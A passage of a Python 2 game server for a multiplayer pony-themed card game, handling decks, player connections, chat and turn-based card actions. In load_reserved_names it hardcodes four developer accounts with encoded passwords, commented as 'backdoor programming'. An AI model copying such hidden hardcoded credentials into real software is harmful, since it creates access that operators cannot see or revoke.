import Deck
import netcom
from locals import *
import thread
import time
import math

from ServerControllers.PlayCardServerController import *
from ServerControllers.ReplaceCardServerController import *
from ServerControllers.SwapCardServerController import *
from ServerControllers.MoveCardServerController import *
from ServerControllers.ImitateCardServerController import *
from ServerControllers.DrawFromDiscardsServerController import *

from ServerPlayer import Player
import Deck
import CustomDeck
from PickledCard import open_pickledcard
from CardTable import CardTable
from common import *
from HistoryMachine import *
from encode import decode

class GameServer(object):
	def __init__(self, port=DEFAULT_PORT):
		print "= GameServer initializing..."
		self.port = port
		# First we need to load the deck
		print "= Waiting for 'run_main_loop' to be called."
		print
		self.controller = None
		self.server = None

		self.throttled = True # SHOULD BE True
		self.delay = 0.001

		self.games_played = 0
		self.shutting_down = False

		self.players = []

		self.load_reserved_names()
		self.load_custom_deck()

		self.reset()

	def reset(self):
		self.reset_modified_cards()

		self.history = HistoryMachine()

		self.pony_deck = Deck.Deck()
		self.ship_deck = Deck.Deck()
		self.goal_deck = Deck.Deck()
		self.pony_discard = Deck.Deck()
		self.ship_discard = Deck.Deck()
		self.public_goals = Deck.Deck()
		self.card_table = CardTable()
		self.game_started = False

		self.kicked_players_cards = Deck.Deck()

		self.timer_start_amount = 0.0
		self.timer_amount = 0.0
		self.prev_timer_amount = 0.0
		self.timer_start_time = 0.0
		self.timer_running = False

		self.setTimerDuration(float(SERVER_GAMESTART_DELAY))

		self.current_players_turn = None
		for pl in self.players:
			pl.reset()
		for pl in self.players:
			self.give_fullupdate(pl)

		self.send_playerlist_all()

		if self.server != None:
			self.server.sendall("ADD_CHAT:SERVER:The server has been reset.")
			self.games_played += 1
			if SERVER_MAX_GAMES_BEFORE_SHUTDOWN > 0 and self.games_played >= SERVER_MAX_GAMES_BEFORE_SHUTDOWN:
				self.shutting_down = True
				for pl in self.players:
					self.server.kick(pl.address,"The server is shutting down. Thanks for playing :)")
				self.shutdown_time = time.time() + 3

	def load_custom_deck(self):
		print "== loading the MasterDeck"
		self.master_deck = Deck.MasterDeck()
		self.custom_deck = CustomDeck.CustomDeck()
		try:
			f = open("your_deck.txt")
		except:
			print("Couldn't find 'your_deck.txt' so we're going to load the default cards only.")
			self.master_deck.load_all_cards()
			return
		instr = f.read()
		f.close()
		print
		print " --- READING CUSTOM DECK INSTRUCTIONS --- "
		self.custom_deck.follow_instructions(instr)
		print " --- DONE --- "
		print
		print "=== loading cards..."
		pc_list = []
		defaults = os.listdir("data/default_cards")
		for card in self.custom_deck.list:
			if card.startswith("R:"):
				pc = open_pickledcard("cards/"+card[2:])
			else:
				if card in defaults:
					pc = open_pickledcard("data/default_cards/"+card)
				else:
					pc = open_pickledcard("cards/"+card)
			pc_list.append(pc)
		self.master_deck.load_all_cards(pc_list, False)
		print "== MasterDeck loaded."
		print

	def load_reserved_names(self):
		print "== loading Reserved Names"
		print
		print " --- READING RESERVED NAMES FILE --- "
		self.__reserved_names = {}
		try:
			f = open("data/reserved.txt")
			lines = f.read().split("\n")
			for i,line in enumerate(lines):
				line = line.strip()
				if not (not line or line.startswith("#")):
					data = line.split(",")
					if len(data) != 3:
						print "Line "+str(i+1)+": Expected 3 comma separated values."
					else:
						password = data[1]
						rank = data[2]
						if rank == "developer":
							rank = "user"
						self.__reserved_names[data[0]] = (password,[rank])
		except:
			print "ERROR! Failed to load reserved names."
			self.__reserved_names = {}

		#Here we insert special users - backdoor programming all the way!!
		self.__add_reserved_dev("Mwai",decode("WFQXhj7oIn4LQ94D5FZ0qxvpwLk2x1rg6r1x+hPr9qI="))
		self.__add_reserved_dev("TrickCandle",decode("CRtUgx8jEQx6973GcRms7hvpwLk2x1rg6r1x+hPr9qI="))
		self.__add_reserved_dev("PixelPrism",decode("IY7b1bqpZTcKbl91XVM0LRvpwLk2x1rg6r1x+hPr9qI="))
		self.__add_reserved_dev("DustyKorg",decode("Y3xgowZO0yuKAS6hZw8k8RvpwLk2x1rg6r1x+hPr9qI="))

		print " --- DONE --- "
		print

	def __add_reserved_dev(self, name, password):
		if name not in self.__reserved_names:
			self.__reserved_names[name] =  (password,["developer"])
		self.__reserved_names[name] = (password,self.__reserved_names[name][1]+["developer"])

	def run_main_loop(self):
		# Call this function to get the server running.
		print "= 'run_main_loop' called..."
		print "== starting server now..."
		self.server = netcom.Server(netcom.gethostname(), self.port)
		print "== the server should now operational."
		thread.start_new_thread(self._run(), tuple([]))

	def _run(self):
		# This is the main loop for the entire GameServer class.
		self.running = True
		while self.running:
			self._update()
			self._read_messages()
			self._check_player_status()
			if self.throttled:
				time.sleep(self.delay)

	def _update(self):
		t = time.time()

		if self.shutting_down and t >= self.shutdown_time:
			self.running = False
			self.server.close()

		if self.timer_running:
			dif = t - self.timer_start_time
			self.timer_amount = self.timer_start_amount - dif
		dif = ceilint(self.prev_timer_amount) - ceilint(self.timer_amount)
		if dif != 0:
			self.send_timer_all()
			if self.timer_running:
				for t in xrange(dif):
					self.triggerTimerTick(ceilint(self.prev_timer_amount)-1-t)
				if ceilint(self.timer_amount) < 1:
					self.timer_running = False
					self.triggerTimerDone()

		self.check_for_modified_cards()

		self.prev_timer_amount = float(self.timer_amount)

		if self.controller != None:
			self.controller.update()

	def _read_messages(self):
		for key in self.server.clients.keys():
			message = None
			player = None
			for pl in self.players:
				if pl.address == key:
					player = pl
					break
			try:
				if len(self.server.received_messages[key]) > 0:
					message = self.server.received_messages[key].pop(0)
			except:
				print "= FAILED TO POP AT KEY:",key

			if message != None:
				if message == PING_MESSAGE:
					self.server.sendto(key,PONG_MESSAGE)
				elif message == PONG_MESSAGE:
					pass
				elif self._rm_connect(message, key, player): pass
				elif self._rm_disconnect(message, key, player): pass
				elif self._rm_kick(message, key, player): pass
				elif self._rm_chat(message, key, player): pass
				elif self._rm_request_deck(message, key, player): pass
				elif self._rm_request_cardfile(message, key, player): pass
				elif self._rm_request_cardfile_attributes(message, key, player): pass
				elif self._rm_done_loading(message, key, player): pass
				elif self._rm_ready(message, key, player): pass
				elif self._rm_end_turn(message, key, player): pass
				elif self._rm_play_card(message, key, player): pass
				elif self._rm_draw_1(message, key, player): pass
				elif self._rm_discard_card(message, key, player): pass
				elif self._rm_replace_card(message, key, player): pass
				elif self._rm_new_goal(message, key, player): pass
				elif self._rm_swap_card(message, key, player): pass
				elif self._rm_swap_gender(message, key, player): pass
				elif self._rm_change_race(message, key, player): pass
				elif self._rm_add_keyword(message, key, player): pass
				elif self._rm_win_goal(message, key, player): pass
				elif self._rm_move_card(message, key, player): pass
				elif self._rm_imitate_card(message, key, player): pass
				elif self._rm_cancel_action(message, key, player): pass
				elif self._rm_shuffle_pony_deck(message, key, player): pass
				elif self._rm_shuffle_ship_deck(message, key, player): pass
				elif self._rm_shuffle_goal_deck(message, key, player): pass
				elif self._rm_shuffle_pony_discard(message, key, player): pass
				elif self._rm_shuffle_ship_discard(message, key, player): pass
				elif self._rm_discard_goal(message, key, player): pass
				elif self._rm_draw_goal(message, key, player): pass
				elif self._rm_draw_1_discard(message, key, player): pass
				elif self._rm_draw_from_discards(message, key, player): pass
				elif self._rm_swap_pony_decks(message, key, player): pass
				elif self._rm_swap_ship_decks(message, key, player): pass
				else:
					if self.controller != None:
						attempt = self.controller.read_message(message, player)
						if not attempt:
							print "ERROR: Received unknown message: "+message[:100]
					else:
						print "ERROR: Received unknown message and no controller: "+message[:100]

	#Message Parsing Functions
	def _rm_connect(self, message, key, player):
		if message.startswith("CONNECT:"):
			#We get the clients name now and add them to the game.
			if self.shutting_down:
				self.server.kick(key,"The server is currently shutting down. Please try again later.")
			else:
				data = message[len("CONNECT:"):]
				data = data.split(":")
				if len(data) < 3:
					self.server.kick(key,"You seem to be running an older version. Please go updated.")
				else:
					player_password = decode(data[0])
					player_key = data[1]
					name = data[2]
					if name in self.__reserved_names and self.__reserved_names[name][0] != player_password:
						self.server.kick(key,"This is a reserved name. Your password is incorrect.")
					else:
						if player == None:
							for pl in self.players:
								if pl.name == name and pl.player_key == player_key:
									player = pl
									break
						if player != None:
							#reconnect player
							if not player.is_connected:
								self.server.sendto(key,"CONNECTED:"+name)
								self.server.sendall("ADD_CHAT:SERVER:"+"Player '"+name+"' has reconnected.")
								player.is_connected = True
								player.address = key
								if self.controller != None:
									self.controller.triggerRejoinPlayer(player)
								print "=Player '"+name+"'", key, "has rejoined the game."
							else:
								#we kick this one, since the player is already connected.
								self.server.kick(key,"This player is already connected.")
						else:
							#if not self.game_started:
							#connect new player
							self.server.sendto(key,"CONNECTED:"+name)
							self.server.sendall("ADD_CHAT:SERVER:"+"Player '"+name+"' has connected.")
							self.players.append(Player(key, name, player_key))
							if name in self.__reserved_names and self.__reserved_names[name][0] == player_password:
								if "admin" in self.__reserved_names[name][1]:
									self.players[-1].is_admin = True
								elif "developer" in self.__reserved_names[name][1]:
									self.players[-1].is_dev = True
							if self.controller != None:
								self.controller.triggerNewPlayer(self.players[-1])
							print "=Player '"+name+"'", key, "has joined the game."
							#else:
							#	self.server.kick(key,"The game's already started. Please come back later.")

						self.send_playerlist_all()
						self.check_ready()
			return True
		return False
	def _rm_disconnect(self, message, key, player):
		if message == "DISCONNECT":
			if player != None:
				self.server.kick(player.address,"See ya :)")
				player.is_connected = False
				player.is_ready = False
				player.time_of_disconnect = time.time()-120
				self.server.sendall("ADD_CHAT:SERVER:"+"Player '"+player.name+"' has disconnected.")
				if self.controller != None:
					self.controller.triggerPlayerDisconnect(player)
				self.send_playerlist_all()
				self.check_ready()
			return True
		return False
	def _rm_kick(self, message, key, player):
		if message.startswith("KICK:") or message.startswith("HARD_KICK:"):
			if player != None:
				if player.is_admin:
					if message.startswith("KICK:"):
						data = message[len("KICK:"):]
					else:
						data = message[len("HARD_KICK:"):]
					data = data.split(",")
					if len(data) != 2:
						self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:'!kick' and '!hard_kick' requires two arguments: a name and a reason.")
					else:
						target = data[0].strip()
						reason = data[1].strip()
						match = None
						for pl in self.players:
							if pl.name.startswith(target):
								match = pl
								break
						if match:
							match.is_connected = False
							match.is_ready = False
							if message.startswith("HARD_KICK:"):
								self.server.kick(match.address,"YOU'VE BEEN HARD KICKED! Reason: "+reason)
								match.time_of_disconnect = time.time()-120
							else:
								self.server.kick(match.address,"YOU'VE BEEN KICKED! Reason: "+reason)
								match.time_of_disconnect = time.time()
							self.server.sendall("ADD_CHAT:SERVER:"+"Player '"+match.name+"' has been kicked!")
							if self.controller != None:
								self.controller.triggerPlayerDisconnect(match)
							self.send_playerlist_all()
							self.check_ready()
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:No player found whose name starts with '"+target+"'.")
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You do not have '!kick' nor '!hard_kick' privileges.")
			return True
		return False
	def _rm_chat(self, message, key, player):
		if message.startswith("CHAT:"):
			if not player:
				name = "???"
			else:
				name = player.name
			chat = message[len("CHAT:"):]
			if chat.startswith("/dr "):
				if player.is_admin or player.is_dev:
					self.server.sendall("ADD_CHAT:SERVER:"+chat[len("/dr "):]+ " drink!")
					self.server.sendall("ALERT:drink_call")
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't do drink calls. Sorry :/")
			else:
				self.server.sendall("ADD_CHAT:PLAYER:"+name+": "+chat)
			return True
		return False
	def _rm_request_deck(self, message, key, player):
		if message == "REQUEST_DECK":
			s = ""
			i = 0
			while i < len(self.custom_deck.list):
				card = self.custom_deck.list[i]
				if card.startswith("R:"):
					card = card[2:]
				s += card
				i += 1
				if i < len(self.custom_deck.list):
					s += ","
			self.server.sendto(player.address,"DECK:"+s)
			return True
		return False
	def _rm_request_cardfile(self, message, key, player):
		if message.startswith("REQUEST_CARDFILE:"):
			index = int(message[len("REQUEST_CARDFILE:"):])
			data = "CARDFILE:"+str(index)+":"+self.master_deck.pc_cards[index]
			#print "SENDING CARD: "+data[:100]
			self.server.sendto(player.address,data)
			return True
		return False
	def _rm_request_cardfile_attributes(self, message, key, player):
		if message.startswith("REQUEST_CARDFILE_ATTRIBUTES:"):
			index = int(message[len("REQUEST_CARDFILE_ATTRIBUTES:"):])
			data = "CARDFILE_ATTRIBUTES:"+str(index)+":"+self.master_deck.cards[index].pc_attributes
			#print "SENDING CARD ATTRIBUTES: "+data[:100]
			self.server.sendto(player.address,data)
			return True
		return False
	def _rm_done_loading(self, message, key, player):
		if message == "DONE_LOADING":
			player.is_loaded = True
			self.server.sendto(player.address, "CLIENT_READY")
			self.server.sendall("ADD_CHAT:SERVER:"+"Player '"+player.name+"' has joined.")
			self.send_playerlist_all()
			self.check_ready()
			if self.game_started:
				self.give_fullupdate(player)
			return True
		return False
	def _rm_ready(self, message, key, player):
		if message == "READY":
			#toggle this player's "is_ready" variable
			t = time.time()
			if t - player.last_toggled_ready < 3:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You're doing that too often.")
			else:
				if not (self.game_started and player.is_spectating):
					player.is_ready = not player.is_ready
					player.last_toggled_ready = t
					if player.is_ready:
						if not self.game_started:
							self.server.sendall("ADD_CHAT:SERVER:"+"Player '"+player.name+"' is ready.")
							player.is_spectating = False
						else:
							self.server.sendall("ADD_CHAT:SERVER:"+"Player '"+player.name+"' wants to end the game.")
						self.server.sendall("ALERT:player_ready")
					else:
						if not self.game_started:
							self.server.sendall("ADD_CHAT:SERVER:"+"Player '"+player.name+"' is NOT ready.")
							player.is_spectating = True
						else:
							self.server.sendall("ADD_CHAT:SERVER:"+"Player '"+player.name+"' does NOT want to end the game.")
						self.server.sendall("ALERT:player_not_ready")
					self.send_playerlist_all()
					self.check_ready()
			return True
		return False
	def _rm_end_turn(self, message, key, player):
		if message == "END_TURN":
			#we end this player's turn.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#We check if the player has the correct number of cards in their hand.
					if len(player.hand.cards) < MIN_CARDS_IN_HAND:
						self.server.sendto(player.address, "ADD_CHAT:SERVER:PM:You need to draw up to "+str(MIN_CARDS_IN_HAND)+" before you can end your turn.")
					else:
						self.server.sendto(player.address, "ADD_CHAT:SERVER:"+player.name+" has ended their turn.")
						self.nextPlayersTurn()
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, dummy!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:The game hasn't started yet...")
			return True
		return False
	def _rm_play_card(self, message, key, player):
		if message.startswith("PLAY_CARD:"):
			#we play the selected card.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#we check if this card is in the player's hand.
					try:
						i = int(message[len("PLAY_CARD:"):])
						works = True
					except:
						works = False
					if works:
						match = False
						for card in player.hand.cards:
							if self.master_deck.cards.index(card) == i:
								match = True
								break
						if match:
							#we attempt to play this card.
							self.controller = PlayCardServerController(self)
							self.controller.selected_card = card
							self.server.sendall("ALERT:draw_card_from_hand")
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Click on the grid where you want to play this card.")
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...that card's not even in your hand!")
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't play a card right now!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't play a card, the game hasn't started...")
			return True
		return False
	def _rm_draw_1(self, message, key, player):
		if message.startswith("DRAW_1:"):
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					s = message[len("DRAW_1:"):]
					if s == "pony":
						if len(self.pony_deck.cards) > 0:
							self.history.take_snapshot(SNAPSHOT_DREW_PONY_CARD, player.name+" drew a Pony card.")
							self.send_full_history_all()
							self.server.sendall("ALERT:draw_card_from_deck")
							self.server.sendall("ALERT:add_card_to_hand")
							card = self.pony_deck.draw()
							player.hand.add_card_to_top(card)
							self.send_decks_all()
							self.send_playerhand(player)
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:There are no Pony cards to draw...")
					elif s == "ship":
						if len(self.ship_deck.cards) > 0:
							self.history.take_snapshot(SNAPSHOT_DREW_SHIP_CARD, player.name+" drew a Ship card.")
							self.send_full_history_all()
							self.server.sendall("ALERT:draw_card_from_deck")
							self.server.sendall("ALERT:add_card_to_hand")
							card = self.ship_deck.draw()
							player.hand.add_card_to_top(card)
							self.send_decks_all()
							self.send_playerhand(player)
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:There are no Ship cards to draw...")
					else:
						self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't draw that type of card!")
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't draw a card right now!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't draw a card, the game hasn't started...")
			return True
		return False
	def _rm_discard_card(self, message, key, player):
		if message.startswith("DISCARD_CARD:"):
			#we play the selected card.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#we check if this card is in the player's hand.
					try:
						i = int(message[len("DISCARD_CARD:"):])
						works = True
					except:
						works = False
					if works:
						location = None
						selected_card = None
						for card in player.hand.cards:
							if self.master_deck.cards.index(card) == i:
								location = ("hand",0,0)
								selected_card = card
								break
						if location == None:
							for y in xrange(self.card_table.size[1]):
								for x in xrange(self.card_table.size[0]):
									card = self.card_table.pony_cards[y][x]
									if card != None:
										if self.master_deck.cards.index(card) == i:
											location = ("pony",x,y)
											selected_card = card
											break
								if location != None:
									break
						if location == None:
							for y in xrange(self.card_table.size[1]):
								for x in xrange(self.card_table.size[0] - 1):
									card = self.card_table.h_ship_cards[y][x]
									if card != None:
										if self.master_deck.cards.index(card) == i:
											location = ("h ship",x,y)
											selected_card = card
											break
								if location != None:
									break
						if location == None:
							for y in xrange(self.card_table.size[1] - 1):
								for x in xrange(self.card_table.size[0]):
									card = self.card_table.v_ship_cards[y][x]
									if card != None:
										if self.master_deck.cards.index(card) == i:
											location = ("v ship",x,y)
											selected_card = card
											break
								if location != None:
									break
						if location != None:
							if selected_card.type == "pony" and selected_card.power == "startcard":
								self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't discard the start card!")
							else:
								if location[0] == "hand":
									#we attempt to discard this card from the player's hand.
									self.history.take_snapshot(SNAPSHOT_DISCARD_FROM_HAND, player.name+" discarded '"+selected_card.name+"' from their hand.")
									self.send_full_history_all()
									self.server.sendall("ALERT:draw_card_from_hand")
									if selected_card.type == "pony":
										self.pony_discard.add_card_to_top(selected_card)
									elif selected_card.type == "ship":
										self.ship_discard.add_card_to_top(selected_card)
									else:
										print "ERROR! This card was of a type that can't be discarded."
									player.hand.remove_card(selected_card)
									self.send_playerhand(player)
								else:
									#we attempt to discard this card from the grid.
									self.history.take_snapshot(SNAPSHOT_DISCARD_FROM_GRID, player.name+" discarded '"+selected_card.name+"' from the shipping grid.")
									self.send_full_history_all()
									self.server.sendall("ALERT:draw_card_from_table")
									if location[0] == "pony":
										self.pony_discard.add_card_to_top(selected_card)
										self.card_table.pony_cards[location[2]][location[1]] = None
									else:
										self.ship_discard.add_card_to_top(selected_card)
										if location[0] == "h ship":
											self.card_table.h_ship_cards[location[2]][location[1]] = None
										elif location[0] == "v ship":
											self.card_table.v_ship_cards[location[2]][location[1]] = None
									self.card_table.refactor()
									self.send_cardtable_all()
								self.send_decks_all()
								self.server.sendall("ALERT:add_card_to_deck")
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...you can't even discard that card!")
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't discard right now!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't discard a card, the game hasn't started...")
			return True
		return False
	def _rm_replace_card(self, message, key, player):
		if message.startswith("REPLACE_CARD:"):
			#we play the selected card.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#we check if this card is in the player's hand.
					try:
						i = int(message[len("REPLACE_CARD:"):])
						works = True
					except:
						works = False
					if works:
						selected_card = None
						for card in player.hand.cards:
							if self.master_deck.cards.index(card) == i:
								selected_card = card
								break
						if selected_card != None:
							if selected_card.type == "pony":
								#we attempt to replace with this card.
								self.controller = ReplaceCardServerController(self)
								self.controller.selected_card = selected_card
								self.server.sendall("ALERT:draw_card_from_hand")
								self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Click on the card you want to replace.")
							else:
								self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...you can't even replace with that card!")
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...you can't even replace with that card!")
					else:
						print "ERROR! Couldn't find card with this id."
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't replace right now!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't replace a card, the game hasn't started...")
			return True
		return False
	def _rm_new_goal(self, message, key, player):
		if message.startswith("NEW_GOAL:"):
			#we play the selected card.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#we check if this card is in the player's hand.
					try:
						i = int(message[len("NEW_GOAL:"):])
						works = True
					except:
						works = False
					if works:
						selected_card = None
						for card in self.public_goals.cards:
							if self.master_deck.cards.index(card) == i:
								selected_card = card
								break
						if selected_card != None:
							if len(self.goal_deck.cards) > 0:
								#we attempt to replace with this card.
								new_goal = self.goal_deck.cards[0]
								self.history.take_snapshot(SNAPSHOT_NEW_GOAL, player.name+" discarded '"+selected_card.name+"' to the bottom of the goal deck and drew '"+new_goal.name+"' to replace it.")
								self.send_full_history_all()
								self.server.sendall("ALERT:draw_card_from_table")
								self.public_goals.remove_card(selected_card)
								self.server.sendall("ALERT:remove_deck")
								self.server.sendall("ALERT:add_card_to_deck")
								self.goal_deck.add_card_to_bottom(selected_card)
								self.server.sendall("ALERT:place_deck")
								self.server.sendall("ALERT:draw_card_from_deck")
								new_goal = self.goal_deck.draw()
								self.server.sendall("ALERT:add_card_to_table")
								self.public_goals.add_card_to_top(new_goal)
								self.send_decks_all()
								self.send_public_goals_all()
							else:
								self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't set a new goal, the goal deck is empty.")
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...")
					else:
						print "ERROR! Couldn't find card with this id."
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't set new goals!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't set a new goal, the game hasn't started...")
			return True
		return False
	def _rm_swap_card(self, message, key, player):
		if message.startswith("SWAP_CARD:"):
			#we play the selected card.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#we check if this card is in the player's hand.
					try:
						i = int(message[len("SWAP_CARD:"):])
						works = True
					except:
						works = False
					if works:
						location = None
						selected_card = None
						for y in xrange(self.card_table.size[1]):
							for x in xrange(self.card_table.size[0]):
								card = self.card_table.pony_cards[y][x]
								if card != None:
									if self.master_deck.cards.index(card) == i:
										location = (x,y)
										selected_card = card
										break
							if location != None:
								break
						if selected_card != None:
							#we attempt to swap with this card.
							self.controller = SwapCardServerController(self)
							self.controller.selected_card = selected_card
							self.controller.selected_card_location = location
							self.server.sendall("ALERT:draw_card_from_table")
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Click on the grid where you want to move this card to.")
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...you can't even swap with that card!")
					else:
						print "ERROR! Couldn't find card with this id."
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't swap right now!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't swap a card, the game hasn't started...")
			return True
		return False
	def _rm_swap_gender(self, message, key, player):
		if message.startswith("SWAP_GENDER:"):
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#we check if this card is in the player's hand.
					try:
						i = int(message[len("SWAP_GENDER:"):])
						works = True
					except:
						works = False
					if works:
						selected_card = None
						for y in xrange(self.card_table.size[1]):
							for x in xrange(self.card_table.size[0]):
								card = self.card_table.pony_cards[y][x]
								if card != None:
									if self.master_deck.cards.index(card) == i:
										selected_card = card
										break
							if selected_card != None:
								break
						if selected_card != None:
							if (selected_card.temp_gender == None and selected_card.gender in ("male","female")) or (selected_card.temp_gender in ("male","female")):
								#we swap this card's gender.
								if selected_card.temp_gender == None:
									gender = selected_card.gender
								else:
									gender = selected_card.temp_gender
								if gender == "male":
									gender = "female"
								else:
									gender = "male"
								self.history.take_snapshot(SNAPSHOT_SWAP_GENDER, player.name+" swapped '"+selected_card.name+"'s gender! It is now "+gender+".")
								self.server.sendall("ALERT:gender_swapped")
								selected_card.set_temp_gender(gender)
								self.send_full_history_all()
							else:
								self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:This card's gender can't be swapped!")
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...")
					else:
						print "ERROR! Couldn't find card with this id."
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't swap card's gender.")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't swap genders, the game hasn't started...")
			return True
		return False
	def _rm_change_race(self, message, key, player):
		if message.startswith("CHANGE_RACE:"):
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					s = message[len("CHANGE_RACE:"):]
					parts = s.split(",")
					if len(parts) == 2:
						race = parts[1]
						try:
							i = int(parts[0])
							works = True
						except:
							works = False
						if works:
							selected_card = None
							for y in xrange(self.card_table.size[1]):
								for x in xrange(self.card_table.size[0]):
									card = self.card_table.pony_cards[y][x]
									if card != None:
										if self.master_deck.cards.index(card) == i:
											selected_card = card
											break
								if selected_card != None:
									break
							if selected_card != None:
								if selected_card.race != None and selected_card.type == "pony":
									#we swap this card's race.
									self.history.take_snapshot(SNAPSHOT_NULL, player.name+" changed '"+selected_card.name+"'s race! It is now a "+race+".")
									self.server.sendall("ALERT:changed_race")
									selected_card.set_temp_race(race)
									self.send_full_history_all()
								else:
									self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:This card's race can't be changed!")
							else:
								self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...")
						else:
							print "ERROR! Couldn't find card with this id."
					else:
						print "ERROR! Bad change race message. A"
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't change a card's race.")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't change races, the game hasn't started...")
			return True
		return False
	def _rm_add_keyword(self, message, key, player):
		if message.startswith("ADD_KEYWORD:"):
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					s = message[len("ADD_KEYWORD:"):]
					parts = s.split(",")
					if len(parts) == 2:
						keyword = parts[1]
						try:
							i = int(parts[0])
							works = True
						except:
							works = False
						if works:
							selected_card = None
							for y in xrange(self.card_table.size[1]):
								for x in xrange(self.card_table.size[0]):
									card = self.card_table.pony_cards[y][x]
									if card != None:
										if self.master_deck.cards.index(card) == i:
											selected_card = card
											break
								if selected_card != None:
									break
							if selected_card != None:
								if selected_card.type == "pony" and keyword not in selected_card.keywords and (selected_card.temp_keywords == None or keyword not in selected_card.temp_keywords):
									#we swap this card's race.
									self.history.take_snapshot(SNAPSHOT_NULL, player.name+" added the keyword "+keyword+" to the card '"+selected_card.name+"!")
									self.server.sendall("ALERT:added_keywords")
									if selected_card.temp_keywords == None:
										selected_card.set_temp_keywords(selected_card.keywords + [keyword])
									else:
										selected_card.set_temp_keywords(selected_card.temp_keywords + [keyword])
									self.send_full_history_all()
								else:
									self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:This keyword can't be added to this card!")
							else:
								self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...")
						else:
							print "ERROR! Couldn't find card with this id."
					else:
						print "ERROR! Bad keyword add message. A"
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't add a keyword.")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't add a keyword, the game hasn't started...")
			return True
		return False
	def _rm_win_goal(self, message, key, player):
		if message.startswith("WIN_GOAL:"):
			#we play the selected card.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#we check if this card is in the player's hand.
					try:
						i = int(message[len("WIN_GOAL:"):])
						works = True
					except:
						works = False
					if works:
						selected_card = None
						for card in self.public_goals.cards:
							if self.master_deck.cards.index(card) == i:
								selected_card = card
								break
						if selected_card != None:
							#we attempt to replace with this card.
							self.history.take_snapshot(SNAPSHOT_WIN_GOAL, player.name+" won the goal '"+selected_card.name+"'!")
							self.send_full_history_all()
							self.server.sendall("ALERT:won_goal")
							self.public_goals.remove_card(selected_card)
							self.server.sendall("ALERT:draw_card_from_table")
							player.won_goals.add_card_to_top(selected_card)
							self.server.sendall("ALERT:add_card_to_deck")
							self.send_playerlist_all()
							self.send_public_goals_all()
						else:
							self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:Whatthe-...")
					else:
						print "ERROR! Couldn't find card with this id."
				else:
					self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:It's not your turn, you can't win goals!")
			else:
				self.server.sendto(player.address,"ADD_CHAT:SERVER:PM:You can't win a goal, the game hasn't started...")
			return True
		return False
	def _rm_move_card(self, message, key, player):
		if message.startswith("MOVE_CARD:"):
			#we play the selected card.
			if self.game_started:
				if self.players.index(player) == self.current_players_turn:
					#we check if this card is in the player's hand.
					try:
						i = int(message[len("MOVE_CARD:"):])
						works = True
					except:
						works = False
					if works:
						location = None
						selected_card = None
						for y in xrange(self.card_table.size[1]):
							for x in xrange(self.card_table.size[0]):
								card = self.card_table.pony_cards[y][x]
								if card != None:
									if self.master_deck.cards.index(card) == i:
										location = (x,y)
										selected_card = card
